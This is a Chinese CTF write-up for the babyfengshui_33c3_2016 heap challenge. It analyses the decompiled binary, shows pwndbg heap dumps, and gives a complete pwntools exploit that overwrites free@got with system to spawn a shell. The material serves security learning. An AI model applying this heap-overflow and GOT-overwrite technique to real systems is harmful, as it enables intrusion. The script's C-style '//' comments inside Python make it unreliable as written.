# 【buu】babyfengshui_33c3_2016（详细题解）

## 前言
这应该是到目前为止理解的最透彻的堆题了

## 题解

```
# file ./data/babyfengshui_33c3_2016
./data/babyfengshui_33c3_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cecdaee24200fe5bbd3d34b30404961ca49067c6, stripped
# checksec ./data/babyfengshui_33c3_2016
[*] '/root/xxx/data/babyfengshui_33c3_2016'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
```

32位的程序，开了 Canary, Nx 保护
先放进IDA看看

```c
void __noreturn main()
{
  char v0; // [esp+3h] [ebp-15h] BYREF
  int v1; // [esp+4h] [ebp-14h] BYREF
  _DWORD v2[4]; // [esp+8h] [ebp-10h] BYREF

  v2[1] = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  alarm(0x14u);
  while ( 1 )
  {
    puts("0: Add a user");
    puts("1: Delete a user");
    puts("2: Display a user");
    puts("3: Update a user description");
    puts("4: Exit");
    printf("Action: ");
    if ( __isoc99_scanf("%d", &v1) == -1 )
      break;
    if ( !v1 )
    {
      printf("size of description: ");
      __isoc99_scanf("%u%c", v2, &v0);
      add(v2[0]);
    }
    if ( v1 == 1 )
    {
      printf("index: ");
      __isoc99_scanf("%d", v2);
      delete(LOBYTE(v2[0]));
    }
    if ( v1 == 2 )
    {
      printf("index: ");
      __isoc99_scanf("%d", v2);
```

又是个堆题，常规流程

```c
_DWORD *__cdecl add(size_t a1)
{
  void *s; // [esp+14h] [ebp-14h]
  _DWORD *v3; // [esp+18h] [ebp-10h]

  s = malloc(a1);
  memset(s, 0, a1);
  v3 = malloc(0x80u);
  memset(v3, 0, 0x80u);
  *v3 = s;
  *(&ptr + (unsigned __int8)byte_804B069) = v3;
  printf("name: ");
  get_name((char *)*(&ptr + (unsigned __int8)byte_804B069) + 4, 124);
  update((unsigned __int8)byte_804B069++);
  return v3;
}
```


先看 add 函数
首先申请了description的 chunk ，接着又申请了一个0x80大小的 chunk
然后将 description的 chunk 指针 放到第二个 chunk 中，
接着是一个指针数组 *(&ptr + byte_804b069) 存放第二个 chunk
接着是调用 get_name 函数输入 name
读入 124 字节到第二个 chunk 偏移为 4 的地方

```c
unsigned int __cdecl get_name(char *a1, int a2)
{
  char *v3; // [esp+18h] [ebp-10h]
  unsigned int v4; // [esp+1Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  fgets(a1, a2, stdin);
  v3 = strchr(a1, 10);
  if ( v3 )
    *v3 = 0;
  return __readgsdword(0x14u) ^ v4;
}
```

get_name 函数对输入的 name 进行查找，如果里面有 10，则 将第二个 chunk 中存放 description chunk的指针置0
然后是 update 函数

```c
unsigned int __cdecl update(unsigned __int8 a1)
{
  char v2; // [esp+17h] [ebp-11h] BYREF
  int v3; // [esp+18h] [ebp-10h] BYREF
  unsigned int v4; // [esp+1Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  if ( a1 < (unsigned __int8)byte_804B069 && *(&ptr + a1) )
  {
    v3 = 0;
    printf("text length: ");
    __isoc99_scanf("%u%c", &v3, &v2);
    if ( (char *)(v3 + *(_DWORD *)*(&ptr + a1)) >= (char *)*(&ptr + a1) - 4 )
    {
      puts("my l33t defenses cannot be fooled, cya!");
      exit(1);
    }
    printf("text: ");
    get_name(*(char **)*(&ptr + a1), v3 + 1);
  }
  return __readgsdword(0x14u) ^ v4;
}
```

首先是读入要修改的 description 长度，然后是一个 if 判断
如果 修改的长度 v3 + 指向description的指针 >= 指向name数组的指针 则返回失败
很显然这是一个防止堆溢出的判断
但是这种判断只基于 description 的堆块与 name 堆块地址相邻，所以可以利用堆的分配机制让这两个堆块分开，使其他的 chunk 分布在这两个堆块之间

```c
unsigned int __cdecl delete(unsigned __int8 a1)
{
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  if ( a1 < (unsigned __int8)byte_804B069 && *(&ptr + a1) )
  {
    free(*(void **)*(&ptr + a1));
    free(*(&ptr + a1));
    *(&ptr + a1) = 0;
  }
  return __readgsdword(0x14u) ^ v2;
}
```


delete函数先 free 了第二个 chunk 指向的 chunk 也就是第一个chunk
然后再 free 第二个chunk
接着把第二个 chunk 的指针置0，但是 description 的chunk 指针没有置0

```c
unsigned int __cdecl show(unsigned __int8 a1)
{
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  if ( a1 < (unsigned __int8)byte_804B069 && *(&ptr + a1) )
  {
    printf("name: %s\n", (const char *)*(&ptr + a1) + 4);
    printf("description: %s\n", *(const char **)*(&ptr + a1));
  }
  return __readgsdword(0x14u) ^ v2;
}
```

show函数显示数据
先打印出第二个 chunk 输入的 name 内容
然后打印出第一个 description chunk 里面的内容

先申请三个堆块，大小都是0x80

```python
add(0x80,'nam1',0x80,'aaaa')
add(0x80,'nam2',0x80,'bbbb')
add(0x80,'nam3',0x80,'/bin/sh\x00')
```

 ```text
 pwndbg> heap
 Allocated chunk | PREV_INUSE
 Addr: 0x9432000
 Size: 0x89
 
 Allocated chunk | PREV_INUSE
 Addr: 0x9432088
 Size: 0x89
 
 Allocated chunk | PREV_INUSE
 Addr: 0x9432110
 Size: 0x89
 
 Allocated chunk | PREV_INUSE
 Addr: 0x9432198
 Size: 0x89
 
 Allocated chunk | PREV_INUSE
 Addr: 0x9432220
 Size: 0x89
 
 Allocated chunk | PREV_INUSE
 Addr: 0x94322a8
 Size: 0x89
 
 Top chunk | PREV_INUSE
 Addr: 0x9432330
 Size: 0x20cd1
 ```

生成了六个堆块

 ```text
 pwndbg> x/80wx 0x9432000
 0x9432000: 0x00000000  0x00000089  0x61616161  0x00000000
 0x9432010: 0x00000000  0x00000000  0x00000000  0x00000000
 ...
 0x9432070: 0x00000000  0x00000000  0x00000000  0x00000000
 0x9432080: 0x00000000  0x00000089  0x00000000  0x00000089
 0x9432090: 0x09432008  0x316d616e  0x00000000  0x00000000
 0x94320a0: 0x00000000  0x00000000  0x00000000  0x00000000
 ...
 0x9432100: 0x00000000  0x00000000  0x00000000  0x00000000
 ```

在这里可以看到堆块的结构，对快的先后顺序是 descriptino chunk0 ，name chunk0
现在释放我们申请的第一个堆块，description chunk0，和 name chunk 0，会合并为一个堆块

 ```text
 pwndbg> bins
 fastbins
 0x10: 0x0
 0x20: 0x0
 0x30: 0x0
 0x40: 0x0
 0x50: 0x0
 0x60: 0x0
 0x70: 0x0
 0x80: 0x0
 
 unsortedbin
 all: 0x82ff000 --> 0x7fede7b0 (main_arena+48) <-- 0x82ff000
 
 smallbins
 empty
 
 largebins
 empty
 ```
 
 ```text
 pwndbg> heap
 Free chunk (unsortedbin) | PREV_INUSE
 Addr: 0x82ff000
 Size: 0x111
 fd:   0x7fede7b0
 bk:   0x7fede7b0
 
 Allocated chunk
 Addr: 0x82ff110
 Size: 0x88
 
 Allocated chunk | PREV_INUSE
 Addr: 0x82ff198
 Size: 0x89
 
 Allocated chunk | PREV_INUSE
 Addr: 0x82ff220
 Size: 0x89
 
 Allocated chunk | PREV_INUSE
 Addr: 0x82ff2a8
 Size: 0x89
 
 Top chunk | PREV_INUSE
 Addr: 0x82ff330
 Size: 0x20cd1
 ```
 

再申请一个新的 chunk0，大小为 0x100，系统后面自动申请 name chunk0的时候，unsortbin 里面的空闲堆块已经不满足要求，就要重新分配，而重新分配的 chunk0_name 则位于堆块尾部

 ```text
 pwndbg> heap
 Allocated chunk | PREV_INUSE
 Addr: 0x9542000
 Size: 0x111
 
 Allocated chunk | PREV_INUSE
 Addr: 0x9542110
 Size: 0x89
 
 Allocated chunk | PREV_INUSE
 Addr: 0x9542198
 Size: 0x89
 
 Allocated chunk | PREV_INUSE
 Addr: 0x9542220
 Size: 0x89
 
 Allocated chunk | PREV_INUSE
 Addr: 0x95422a8
 Size: 0x89
 
 Allocated chunk | PREV_INUSE
 Addr: 0x9542330
 Size: 0x89
 
 Top chunk | PREV_INUSE
 Addr: 0x95423b8
 Size: 0x20c49
 ```
 
 ```text
 pwndbg> x/20wx 0x9542330
 0x9542330: 0x00000000  0x00000089  0x09542008  0x656d616e
 0x9542340: 0x00000031  0x00000000  0x00000000  0x00000000
 0x9542350: 0x00000000  0x00000000  0x00000000  0x00000000
 0x9542360: 0x00000000  0x00000000  0x00000000  0x00000000
 0x9542370: 0x00000000  0x00000000  0x00000000  0x00000000
 ...
 ```


查看最后一个堆块可以看到 chunk0_name 中存有 第一个堆块 chunk0_text 的地址
现在利用堆溢出到第一个堆块的 name chunk上，泄露 free 函数的地址，然后算出libc基址就可以得到system函数的地址了

```python
payload = b'a'*0x108 + b'a'*0x08 + b'a'*0x80 + b'a'*0x08 + p32(free_got)
update(3,0x200,payload)
```

 ```text
 pwndbg> x/180wx 0x90df000
 0x90df000: 0x00000000  0x00000111  0x61616161  0x61616161
 0x90df010: 0x61616161  0x61616161  0x61616161  0x61616161
 ...
 0x90df190: 0x61616161  0x61616161  0x61616161  0x61616161
 0x90df1a0: 0x0804b010  0x326d0000  0x00000000  0x00000000
 0x90df1a0: 0x00000000  0x00000000  0x00000000  0x00000000
 ...
 0x90df210: 0x00000000  0x00000000  0x00000000  0x00000000
 0x90df220: 0x00000000  0x00000089  0x6e69622f  0x0068732f
 0x90df230: 0x0000000a  0x00000000  0x00000000  0x00000000
 0x90df240: 0x00000000  0x00000000  0x00000000  0x00000000
 ...
 0x90df2a0: 0x00000000  0x00000000  0x00000000  0x00000000
 0x90df2b0: 0x090df228  0x336d616e  0x00000000  0x00000000
 0x90df2c0: 0x00000000  0x00000000  0x00000000  0x00000000
 
 pwndbg> x/wx 0x0804b010
 0x804b010 <free@got.plt>: 0xf7db4380
 ```

之前往第三个 chunk 里面写进了 /bin/sh\x00，现在只要把 free_got 替换为 system的地址，当我们在 free 掉第三个 chunk 的时候就会执行 system(‘/bin/sh’)，获取shell

## 完整脚本

```python
from pwn import*
context.log_level  = "debug"
elf = ELF('./pwn')
libc = ELF('./buulibc/libc-2.23.i386.so')
#io = remote('node4.buuoj.cn',26247)
io = process('./pwn')

def add(size,name,length,text):
	io.recvuntil(b'Action: ')
	io.sendline(b'0')
	io.recvuntil(b'size of description: ')
	io.sendline(str(size))
	io.recvuntil(b'name: ')
	io.sendline(name)
	io.recvuntil(b'text length: ')
	io.sendline(str(length))
	io.recvuntil(b'text: ')
	io.sendline(text)
def delete(id):
	io.recvuntil(b'Action: ')
	io.sendline(b'1')
	io.recvuntil(b'index: ')
	io.sendline(str(id))
def show(id):
	io.recvuntil(b'Action: ')
	io.sendline(b'2')
	io.recvuntil(b'index: ')
	io.sendline(str(id))
def update(id,length,text):
	io.recvuntil(b'Action: ')
	io.sendline(b'3')
	io.recvuntil(b'index: ')
	io.sendline(str(id))
	io.recvuntil(b'text length: ')
	io.sendline(str(length))
	io.recvuntil(b'text: ')
	io.sendline(text)

add(0x80,b'nam1',0x80,b'aaaa')
add(0x80,b'nam2',0x80,b'bbbb')
add(0x80,b'nam3',0x80,b'/bin/sh\x00')
delete(0)
add(0x100,b'name1',0x100,b'cccc') //申请新的 chunk id为3
free_got = elf.got['free'] 
payload = b'a'*0x108 + b'a'*8 + b'a'*0x80 + b'a'*8 + p32(free_got)
update(3,0x200,payload) //在 name thunk1 里面写入 free_got 地址
show(1) //输出地址
io.recvuntil(b'description: ')
free_addr = u32(io.recv(4)) //接收free_got的地址
libc_base = free_addr - libc.sym['free'] //计算libc基址
system = libc_base + libc.sym['system'] //算出system地址
print(hex(system))

update(1,0x80,p32(system)) // 写入system地址
delete(2)
#gdb.attach(io)
#pause()
io.interactive()
```